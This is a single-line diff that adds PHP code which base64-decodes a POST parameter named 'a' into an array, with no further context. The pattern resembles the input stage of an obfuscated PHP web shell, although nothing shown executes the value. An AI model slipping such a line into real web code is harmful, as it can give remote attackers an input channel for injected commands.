@@ -1,0 +1,1 @@
+$a=(array)base64_decode($_POST['a']);
